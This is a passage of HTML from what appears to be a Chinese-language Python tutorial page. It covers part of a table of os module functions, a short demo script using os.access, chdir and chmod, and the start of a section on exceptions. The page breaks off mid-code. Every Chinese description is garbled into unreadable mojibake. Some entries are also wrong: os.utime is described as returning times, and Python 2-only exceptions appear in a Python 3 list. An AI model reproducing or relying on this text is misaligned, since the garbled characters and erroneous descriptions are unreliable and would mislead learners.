åƒstat(),ä½†æ˜¯æ²¡æœ‰è½¯é“¾æ¥</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-major.html">os.major(device)</a> ä»åŸå§‹çš„è®¾å¤‡å·ä¸­æå–è®¾å¤‡majorå·ç  (ä½¿ç”¨statä¸­çš„st_devæˆ–è€…st_rdev field)ã€‚</td></tr><tr><td align="left">32</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-makedev.html">os.makedev(major, minor)</a> ä»¥majorå’Œminorè®¾å¤‡å·ç»„æˆä¸€ä¸ªåŸå§‹è®¾å¤‡å·</td></tr><tr><td align="left">33</td><td align="left">[os.makedirs(path<a href="https://www.runoob.com/python3/python3-os-makedirs.html">, mode])</a> é€’å½’æ–‡ä»¶å¤¹åˆ›å»ºå‡½æ•°ã€‚åƒmkdir(), ä½†åˆ›å»ºçš„æ‰€æœ‰intermediate-levelæ–‡ä»¶å¤¹éœ€è¦åŒ…å«å­æ–‡ä»¶å¤¹ã€‚</td></tr><tr><td align="left">34</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-minor.html">os.minor(device)</a> ä»åŸå§‹çš„è®¾å¤‡å·ä¸­æå–è®¾å¤‡minorå·ç  (ä½¿ç”¨statä¸­çš„st_devæˆ–è€…st_rdev field )ã€‚</td></tr><tr><td align="left">35</td><td align="left">[os.mkdir(path<a href="https://www.runoob.com/python3/python3-os-mkdir.html">, mode])</a> ä»¥æ•°å­—modeçš„modeåˆ›å»ºä¸€ä¸ªåä¸ºpathçš„æ–‡ä»¶å¤¹.é»˜è®¤çš„ mode æ˜¯ 0777 (å…«è¿›åˆ¶)ã€‚</td></tr><tr><td align="left">36</td><td align="left">[os.mkfifo(path<a href="https://www.runoob.com/python3/python3-os-mkfifo.html">, mode])</a> åˆ›å»ºå‘½åç®¡é“ï¼Œmode ä¸ºæ•°å­—ï¼Œé»˜è®¤ä¸º 0666 (å…«è¿›åˆ¶)</td></tr><tr><td align="left">37</td><td align="left">[os.mknod(filename<a href="https://www.runoob.com/python3/python3-os-mknod.html">, mode=0600, device])</a> åˆ›å»ºä¸€ä¸ªåä¸ºfilenameæ–‡ä»¶ç³»ç»ŸèŠ‚ç‚¹ï¼ˆæ–‡ä»¶ï¼Œè®¾å¤‡ç‰¹åˆ«æ–‡ä»¶æˆ–è€…å‘½åpipeï¼‰ã€‚</td></tr><tr><td align="left">38</td><td align="left">[os.open(file, flags<a href="https://www.runoob.com/python3/python3-os-open.html">, mode])</a> æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”è®¾ç½®éœ€è¦çš„æ‰“å¼€é€‰é¡¹ï¼Œmodeå‚æ•°æ˜¯å¯é€‰çš„</td></tr><tr><td align="left">39</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-openpty.html">os.openpty()</a> æ‰“å¼€ä¸€ä¸ªæ–°çš„ä¼ªç»ˆç«¯å¯¹ã€‚è¿”å› pty å’Œ ttyçš„æ–‡ä»¶æè¿°ç¬¦ã€‚</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-pathconf.html">os.pathconf(path, name)</a> è¿”å›ç›¸å…³æ–‡ä»¶çš„ç³»ç»Ÿé…ç½®ä¿¡æ¯ã€‚</td></tr><tr><td align="left">41</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-pipe.html">os.pipe()</a> åˆ›å»ºä¸€ä¸ªç®¡é“. è¿”å›ä¸€å¯¹æ–‡ä»¶æè¿°ç¬¦(r, w) åˆ†åˆ«ä¸ºè¯»å’Œå†™</td></tr><tr><td align="left">42</td><td align="left">[os.popen(command<a href="https://www.runoob.com/python3/python3-os-popen.html">, mode[, bufsize]])</a> ä»ä¸€ä¸ª command æ‰“å¼€ä¸€ä¸ªç®¡é“</td></tr><tr><td align="left">43</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-read.html">os.read(fd, n)</a> ä»æ–‡ä»¶æè¿°ç¬¦ fd ä¸­è¯»å–æœ€å¤š n ä¸ªå­—èŠ‚ï¼Œè¿”å›åŒ…å«è¯»å–å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œæ–‡ä»¶æè¿°ç¬¦ fdå¯¹åº”æ–‡ä»¶å·²è¾¾åˆ°ç»“å°¾, è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left">44</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-readlink.html">os.readlink(path)</a> è¿”å›è½¯é“¾æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶</td></tr><tr><td align="left">45</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-remove.html">os.remove(path)</a> åˆ é™¤è·¯å¾„ä¸ºpathçš„æ–‡ä»¶ã€‚å¦‚æœpath æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå°†æŠ›å‡ºOSError; æŸ¥çœ‹ä¸‹é¢çš„rmdir()åˆ é™¤ä¸€ä¸ª directoryã€‚</td></tr><tr><td align="left">46</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-removedirs.html">os.removedirs(path)</a> é€’å½’åˆ é™¤ç›®å½•ã€‚</td></tr><tr><td align="left">47</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-rename.html">os.rename(src, dst)</a> é‡å‘½åæ–‡ä»¶æˆ–ç›®å½•ï¼Œä» src åˆ° dst</td></tr><tr><td align="left">48</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-renames.html">os.renames(old, new)</a> é€’å½’åœ°å¯¹ç›®å½•è¿›è¡Œæ›´åï¼Œä¹Ÿå¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œæ›´åã€‚</td></tr><tr><td align="left">49</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-rmdir.html">os.rmdir(path)</a> åˆ é™¤pathæŒ‡å®šçš„ç©ºç›®å½•ï¼Œå¦‚æœç›®å½•éç©ºï¼Œåˆ™æŠ›å‡ºä¸€ä¸ªOSErrorå¼‚å¸¸ã€‚</td></tr><tr><td align="left">50</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-stat.html">os.stat(path)</a> è·å–pathæŒ‡å®šçš„è·¯å¾„çš„ä¿¡æ¯ï¼ŒåŠŸèƒ½ç­‰åŒäºC APIä¸­çš„stat()ç³»ç»Ÿè°ƒç”¨ã€‚</td></tr><tr><td align="left">51</td><td align="left">[os.stat_float_times(<a href="https://www.runoob.com/python3/python3-os-stat_float_times.html">newvalue])</a> å†³å®šstat_resultæ˜¯å¦ä»¥floatå¯¹è±¡æ˜¾ç¤ºæ—¶é—´æˆ³</td></tr><tr><td align="left">52</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-statvfs.html">os.statvfs(path)</a> è·å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ç³»ç»Ÿç»Ÿè®¡ä¿¡æ¯</td></tr><tr><td align="left">53</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-symlink.html">os.symlink(src, dst)</a> åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥</td></tr><tr><td align="left">54</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-tcgetpgrp.html">os.tcgetpgrp(fd)</a> è¿”å›ä¸ç»ˆç«¯fdï¼ˆä¸€ä¸ªç”±os.open()è¿”å›çš„æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰å…³è”çš„è¿›ç¨‹ç»„</td></tr><tr><td align="left">55</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-tcsetpgrp.html">os.tcsetpgrp(fd, pg)</a> è®¾ç½®ä¸ç»ˆç«¯fdï¼ˆä¸€ä¸ªç”±os.open()è¿”å›çš„æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰å…³è”çš„è¿›ç¨‹ç»„ä¸ºpgã€‚</td></tr><tr><td align="left">56</td><td align="left">os.tempnam([dir[, prefix]]) <strong>Python3 ä¸­å·²åˆ é™¤ã€‚</strong>è¿”å›å”¯ä¸€çš„è·¯å¾„åç”¨äºåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚</td></tr><tr><td align="left">57</td><td align="left">os.tmpfile() <strong>Python3 ä¸­å·²åˆ é™¤ã€‚</strong>è¿”å›ä¸€ä¸ªæ‰“å¼€çš„æ¨¡å¼ä¸º(w+b)çš„æ–‡ä»¶å¯¹è±¡ .è¿™æ–‡ä»¶å¯¹è±¡æ²¡æœ‰æ–‡ä»¶å¤¹å…¥å£ï¼Œæ²¡æœ‰æ–‡ä»¶æè¿°ç¬¦ï¼Œå°†ä¼šè‡ªåŠ¨åˆ é™¤ã€‚</td></tr><tr><td align="left">58</td><td align="left">os.tmpnam() <strong>Python3 ä¸­å·²åˆ é™¤ã€‚</strong>ä¸ºåˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶è¿”å›ä¸€ä¸ªå”¯ä¸€çš„è·¯å¾„</td></tr><tr><td align="left">59</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-ttyname.html">os.ttyname(fd)</a> è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒè¡¨ç¤ºä¸æ–‡ä»¶æè¿°ç¬¦fd å…³è”çš„ç»ˆç«¯è®¾å¤‡ã€‚å¦‚æœfd æ²¡æœ‰ä¸ç»ˆç«¯è®¾å¤‡å…³è”ï¼Œåˆ™å¼•å‘ä¸€ä¸ªå¼‚å¸¸ã€‚</td></tr><tr><td align="left">60</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-unlink.html">os.unlink(path)</a> åˆ é™¤æ–‡ä»¶è·¯å¾„</td></tr><tr><td align="left">61</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-utime.html">os.utime(path, times)</a> è¿”å›æŒ‡å®šçš„pathæ–‡ä»¶çš„è®¿é—®å’Œä¿®æ”¹çš„æ—¶é—´ã€‚</td></tr><tr><td align="left">62</td><td align="left">[os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])](<a href="https://www.runoob.com/python3/python3-os-walk.html">https://www.runoob.com/python3/python3-os-walk.html</a>) è¾“å‡ºåœ¨æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶åé€šè¿‡åœ¨æ ‘ä¸­æ¸¸èµ°ï¼Œå‘ä¸Šæˆ–è€…å‘ä¸‹ã€‚</td></tr><tr><td align="left">63</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-write.html">os.write(fd, str)</a> å†™å…¥å­—ç¬¦ä¸²åˆ°æ–‡ä»¶æè¿°ç¬¦ fdä¸­. è¿”å›å®é™…å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦</td></tr><tr><td align="left">64</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-path.html">os.path æ¨¡å—</a> è·å–æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ã€‚</td></tr><tr><td align="left">65</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-pardir.html">os.pardir()</a> è·å–å½“å‰ç›®å½•çš„çˆ¶ç›®å½•ï¼Œä»¥å­—ç¬¦ä¸²å½¢å¼æ˜¾ç¤ºç›®å½•åã€‚</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> statret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"F_OK - è¿”å›å€¼ %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># F_OK - è¿”å›å€¼ True</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"R_OK - è¿”å›å€¼ %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># R_OK - è¿”å›å€¼ True</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>W_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"W_OK - è¿”å›å€¼ %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># W_OK - è¿”å›å€¼ True</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>X_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"X_OK - è¿”å›å€¼ %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># X_OK - è¿”å›å€¼ True</span>path <span class="token operator">=</span> <span class="token string">'D:/'</span><span class="token comment"># æŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•</span>retval <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å½“å‰å·¥ä½œç›®å½•ä¸º %s"</span> <span class="token operator">%</span> retval<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å½“å‰å·¥ä½œç›®å½• : %s"</span> <span class="token operator">%</span> os<span class="token punctuation">.</span>getcwdb<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># å½“å‰å·¥ä½œç›®å½•ä¸º F:\</span><span class="token comment"># ä¿®æ”¹å½“å‰å·¥ä½œç›®å½•</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token comment"># æŸ¥çœ‹ä¿®æ”¹åçš„å·¥ä½œç›®å½•</span>retval <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç›®å½•ä¿®æ”¹æˆåŠŸ %s"</span> <span class="token operator">%</span> retval<span class="token punctuation">)</span><span class="token comment"># ç›®å½•ä¿®æ”¹æˆåŠŸ D:\</span><span class="token comment"># path = '/tmp/foo.txt'</span><span class="token comment"># # ä¸ºæ–‡ä»¶è®¾ç½®æ ‡è®°ï¼Œä½¿å¾—å®ƒä¸èƒ½è¢«é‡å‘½åå’Œåˆ é™¤</span><span class="token comment"># flags = stat.SF_NOUNLINK</span><span class="token comment"># retval = os.chflags(path, flags)</span><span class="token comment"># print("è¿”å›å€¼: %s" % retval)</span>path <span class="token operator">=</span> <span class="token string">'D:/test.txt'</span><span class="token keyword">import</span> os<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> stat<span class="token comment"># è®¾ç½®æ–‡ä»¶å¯ä»¥é€šè¿‡ç”¨æˆ·ç»„æ‰§è¡Œ</span>os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> stat<span class="token punctuation">.</span>S_IXGRP<span class="token punctuation">)</span><span class="token comment"># è®¾ç½®æ–‡ä»¶å¯ä»¥è¢«å…¶ä»–ç”¨æˆ·å†™å…¥</span>os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> stat<span class="token punctuation">.</span>S_IWOTH<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä¿®æ”¹æˆåŠŸ!!"</span><span class="token punctuation">)</span><span class="token comment"># è®¾ç½®æ‰€æœ‰è€… ID ä¸º 100</span><span class="token comment"># os.chown("/tmp/foo.txt", 100, -1)</span><span class="token comment"># print("ä¿®æ”¹æƒé™æˆåŠŸ!!")</span><span class="token comment"># è®¾ç½®æ ¹ç›®å½•ä¸º /tmp</span><span class="token comment"># os.chroot("/tmp")</span><span class="token comment"># print("ä¿®æ”¹æ ¹ç›®å½•æˆåŠŸ!!")</span><span class="token comment"># æ‰“å¼€æ–‡ä»¶</span><span class="token comment"># fd = os.open("foo.txt", os.O_RDWR | os.O_CREAT)</span><span class="token comment"># #  å†™å…¥å­—ç¬¦ä¸²</span><span class="token comment"># os.write(fd, "This is test")</span><span class="token comment"># d_fd = os.dup( fd )</span><span class="token comment"># # å…³é—­æ–‡ä»¶</span><span class="token comment"># os.close(fd)</span><span class="token comment"># print("å…³é—­æ–‡ä»¶æˆåŠŸ!!")</span><span class="token comment"># åˆ›å»ºçš„ç›®å½•</span><span class="token comment"># path = "/tmp/home/monthly/daily/hourly"</span><span class="token comment">#</span><span class="token comment"># os.mkdir(path, 0o755)</span><span class="token comment">#</span><span class="token comment"># print("ç›®å½•å·²åˆ›å»º")</span><span class="token comment"># åˆ›å»ºçš„ç›®å½•</span><span class="token comment"># path = "/tmp/hourly"</span><span class="token comment">#</span><span class="token comment"># os.mkfifo(path, 0o644)</span><span class="token comment">#</span><span class="token comment"># print("è·¯å¾„è¢«åˆ›å»º")</span><span class="token comment"># # åˆ—å‡ºç›®å½•</span><span class="token comment"># print("ç›®å½•ä¸º: %s" % os.listdir(os.getcwd()))</span><span class="token comment">#</span><span class="token comment"># # ç§»é™¤</span><span class="token comment"># os.remove("aa.txt")</span><span class="token comment">#</span><span class="token comment"># # ç§»é™¤ååˆ—å‡ºç›®å½•</span><span class="token comment"># print("ç§»é™¤å : %s" % os.listdir(os.getcwd()))</span><span class="token comment"># os.renames(old, new)</span><span class="token comment"># # åˆ—å‡ºç›®å½•</span><span class="token comment"># print("ç›®å½•ä¸º: %s"%os.listdir(os.getcwd()))</span><span class="token comment">#</span><span class="token comment"># # åˆ é™¤è·¯å¾„</span><span class="token comment"># os.rmdir("mydir")</span><span class="token comment">#</span><span class="token comment"># # åˆ—å‡ºé‡å‘½ååçš„ç›®å½•</span><span class="token comment"># print("ç›®å½•ä¸º: %s" %os.listdir(os.getcwd())</span><span class="token comment"># # æ˜¾ç¤ºæ–‡ä»¶ "a2.py" ä¿¡æ¯</span><span class="token comment"># statinfo = os.stat('a2.py')</span><span class="token comment">#</span><span class="token comment"># print(statinfo)</span><span class="token comment"># # æ‰“å¼€æ–‡ä»¶</span><span class="token comment"># fd = os.open("f1.txt", os.O_RDWR | os.O_CREAT)</span><span class="token comment">#</span><span class="token comment"># # å†™å…¥å­—ç¬¦ä¸²</span><span class="token comment"># str = "This is runoob.com site"</span><span class="token comment"># ret = os.write(fd, bytes(str, 'UTF-8'))</span><span class="token comment">#</span><span class="token comment"># # è¾“å…¥è¿”å›å€¼</span><span class="token comment"># print("å†™å…¥çš„ä½æ•°ä¸º: ")</span><span class="token comment"># print(ret)</span><span class="token comment">#</span><span class="token comment"># print("å†™å…¥æˆåŠŸ")</span><span class="token comment">#</span><span class="token comment"># # å…³é—­æ–‡ä»¶</span><span class="token comment"># os.close(fd)</span><span class="token comment"># print("å…³é—­æ–‡ä»¶æˆåŠŸ!!")</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é”™è¯¯å’Œå¼‚å¸¸"><a href="#é”™è¯¯å’Œå¼‚å¸¸" class="headerlink" title="é”™è¯¯å’Œå¼‚å¸¸"></a>é”™è¯¯å’Œå¼‚å¸¸</h2><h3 id="è¯­æ³•é”™è¯¯"><a href="#è¯­æ³•é”™è¯¯" class="headerlink" title="è¯­æ³•é”™è¯¯"></a>è¯­æ³•é”™è¯¯</h3><p>ä¸€èˆ¬ä¸ºæ¼å†™ç¬¦å·ï¼Œæˆ–è€…æ‹¼å†™é”™è¯¯æŠ¥é”™</p><p>è¯­æ³•åˆ†æå™¨æŒ‡å‡ºäº†å‡ºé”™çš„ä¸€è¡Œï¼Œå¹¶ä¸”åœ¨æœ€å…ˆæ‰¾åˆ°çš„é”™è¯¯çš„ä½ç½®æ ‡è®°ä¸€ä¸ªå°å°çš„ç®­å¤´</p><h3 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h3><p>å³ä¾¿ Python ç¨‹åºçš„è¯­æ³•æ˜¯æ­£ç¡®çš„ï¼Œåœ¨è¿è¡Œå®ƒçš„æ—¶å€™ï¼Œä¹Ÿæœ‰å¯èƒ½å‘ç”Ÿé”™è¯¯ã€‚è¿è¡ŒæœŸæ£€æµ‹åˆ°çš„é”™è¯¯è¢«ç§°ä¸ºå¼‚å¸¸</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">/</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># é™¤æ•°ä¸èƒ½ä¸º0æŠ¥å¼‚å¸¸</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span><span class="token string">'2'</span><span class="token punctuation">)</span>  <span class="token comment"># ç±»å‹ä¸èƒ½ç›¸åŠ ï¼Œè§¦å‘å¼‚å¸¸</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="pythonæ ‡å‡†å¼‚å¸¸"><a href="#pythonæ ‡å‡†å¼‚å¸¸" class="headerlink" title="pythonæ ‡å‡†å¼‚å¸¸"></a>pythonæ ‡å‡†å¼‚å¸¸</h3><table><thead><tr><th align="left">å¼‚å¸¸åç§°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td></tr><tr><td align="left">BaseException</td><td align="left">æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»</td></tr><tr><td align="left">SystemExit</td><td align="left">è§£é‡Šå™¨è¯·æ±‚é€€å‡º</td></tr><tr><td align="left">KeyboardInterrupt</td><td align="left">ç”¨æˆ·ä¸­æ–­æ‰§è¡Œ(é€šå¸¸æ˜¯è¾“å…¥^C)</td></tr><tr><td align="left">Exception</td><td align="left">å¸¸è§„é”™è¯¯çš„åŸºç±»</td></tr><tr><td align="left">StopIteration</td><td align="left">è¿­ä»£å™¨æ²¡æœ‰æ›´å¤šçš„å€¼</td></tr><tr><td align="left">GeneratorExit</td><td align="left">ç”Ÿæˆå™¨(generator)å‘ç”Ÿå¼‚å¸¸æ¥é€šçŸ¥é€€å‡º</td></tr><tr><td align="left">StandardError</td><td align="left">æ‰€æœ‰çš„å†…å»ºæ ‡å‡†å¼‚å¸¸çš„åŸºç±»</td></tr><tr><td align="left">ArithmeticError</td><td align="left">æ‰€æœ‰æ•°å€¼è®¡ç®—é”™è¯¯çš„åŸºç±»</td></tr><tr><td align="left">FloatingPointError</td><td align="left">æµ®ç‚¹è®¡ç®—é”™è¯¯</td></tr><tr><td align="left">OverflowError</td><td align="left">æ•°å€¼è¿ç®—è¶…å‡ºæœ€å¤§é™åˆ¶</td></tr><tr><td align="left">ZeroDivisionError</td><td align="left">é™¤(æˆ–å–æ¨¡)é›¶ (æ‰€æœ‰æ•°æ®ç±»å‹)</td></tr><tr><td align="left">AssertionError</td><td align="left">æ–­è¨€è¯­å¥å¤±è´¥</td></tr><tr><td align="left">AttributeError</td><td align="left">å¯¹è±¡æ²¡æœ‰è¿™ä¸ªå±æ€§</td></tr><tr><td align="left">EOFError</td><td align="left">æ²¡æœ‰å†…å»ºè¾“å…¥,åˆ°è¾¾EOF æ ‡è®°</td></tr><tr><td align="left">EnvironmentError</td><td align="left">æ“ä½œç³»ç»Ÿé”™è¯¯çš„åŸºç±»</td></tr><tr><td align="left">IOError</td><td align="left">è¾“å…¥/è¾“å‡ºæ“ä½œå¤±è´¥</td></tr><tr><td align="left">OSError</td><td align="left">æ“ä½œç³»ç»Ÿé”™è¯¯</td></tr><tr><td align="left">WindowsError</td><td align="left">ç³»ç»Ÿè°ƒç”¨å¤±è´¥</td></tr><tr><td align="left">ImportError</td><td align="left">å¯¼å…¥æ¨¡å—/å¯¹è±¡å¤±è´¥</td></tr><tr><td align="left">LookupError</td><td align="left">æ— æ•ˆæ•°æ®æŸ¥è¯¢çš„åŸºç±»</td></tr><tr><td align="left">IndexError</td><td align="left">åºåˆ—ä¸­æ²¡æœ‰æ­¤ç´¢å¼•(index)</td></tr><tr><td align="left">KeyError</td><td align="left">æ˜ å°„ä¸­æ²¡æœ‰è¿™ä¸ªé”®</td></tr><tr><td align="left">MemoryError</td><td align="left">å†…å­˜æº¢å‡ºé”™è¯¯(å¯¹äºPython è§£é‡Šå™¨ä¸æ˜¯è‡´å‘½çš„)</td></tr><tr><td align="left">NameError</td><td align="left">æœªå£°æ˜/åˆå§‹åŒ–å¯¹è±¡ (æ²¡æœ‰å±æ€§)</td></tr><tr><td align="left">UnboundLocalError</td><td align="left">è®¿é—®æœªåˆå§‹åŒ–çš„æœ¬åœ°å˜é‡</td></tr><tr><td align="left">ReferenceError</td><td align="left">å¼±å¼•ç”¨(Weak reference)è¯•å›¾è®¿é—®å·²ç»åƒåœ¾å›æ”¶äº†çš„å¯¹è±¡</td></tr><tr><td align="left">RuntimeError</td><td align="left">ä¸€èˆ¬çš„è¿è¡Œæ—¶é”™è¯¯</td></tr><tr><td align="left">NotImplementedError</td><td align="left">å°šæœªå®ç°çš„æ–¹æ³•</td></tr><tr><td align="left">SyntaxError</td><td align="left">Python è¯­æ³•é”™è¯¯</td></tr><tr><td align="left">IndentationError</td><td align="left">ç¼©è¿›é”™è¯¯</td></tr><tr><td align="left">TabError</td><td align="left">Tab å’Œç©ºæ ¼æ··ç”¨</td></tr><tr><td align="left">SystemError</td><td align="left">ä¸€èˆ¬çš„è§£é‡Šå™¨ç³»ç»Ÿé”™è¯¯</td></tr><tr><td align="left">TypeError</td><td align="left">å¯¹ç±»å‹æ— æ•ˆçš„æ“ä½œ</td></tr><tr><td align="left">ValueError</td><td align="left">ä¼ å…¥æ— æ•ˆçš„å‚æ•°</td></tr><tr><td align="left">UnicodeError</td><td align="left">Unicode ç›¸å…³çš„é”™è¯¯</td></tr><tr><td align="left">UnicodeDecodeError</td><td align="left">Unicode è§£ç æ—¶çš„é”™è¯¯</td></tr><tr><td align="left">UnicodeEncodeError</td><td align="left">Unicode ç¼–ç æ—¶é”™è¯¯</td></tr><tr><td align="left">UnicodeTranslateError</td><td align="left">Unicode è½¬æ¢æ—¶é”™è¯¯</td></tr><tr><td align="left">Warning</td><td align="left">è­¦å‘Šçš„åŸºç±»</td></tr><tr><td align="left">DeprecationWarning</td><td align="left">å…³äºè¢«å¼ƒç”¨çš„ç‰¹å¾çš„è­¦å‘Š</td></tr><tr><td align="left">FutureWarning</td><td align="left">å…³äºæ„é€ å°†æ¥è¯­ä¹‰ä¼šæœ‰æ”¹å˜çš„è­¦å‘Š</td></tr><tr><td align="left">OverflowWarning</td><td align="left">æ—§çš„å…³äºè‡ªåŠ¨æå‡ä¸ºé•¿æ•´å‹(long)çš„è­¦å‘Š</td></tr><tr><td align="left">PendingDeprecationWarning</td><td align="left">å…³äºç‰¹æ€§å°†ä¼šè¢«åºŸå¼ƒçš„è­¦å‘Š</td></tr><tr><td align="left">RuntimeWarning</td><td align="left">å¯ç–‘çš„è¿è¡Œæ—¶è¡Œä¸º(runtime behavior)çš„è­¦å‘Š</td></tr><tr><td align="left">SyntaxWarning</td><td align="left">å¯ç–‘çš„è¯­æ³•çš„è­¦å‘Š</td></tr><tr><td align="left">UserWarning</td><td align="left">ç”¨æˆ·ä»£ç ç”Ÿæˆçš„è­¦å‘Š</td></tr></tbody></table><h3 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h3><h5 id="try-except"><a href="#try-except" class="headerlink" title="try/except"></a>try/except</h5><p>åŸºæœ¬æ ¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    æ‰§è¡Œä»£ç <span class="token keyword">except</span><span class="token punctuation">:</span>    å¼‚å¸¸æ—¶æ‰§è¡Œçš„ä»£ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token 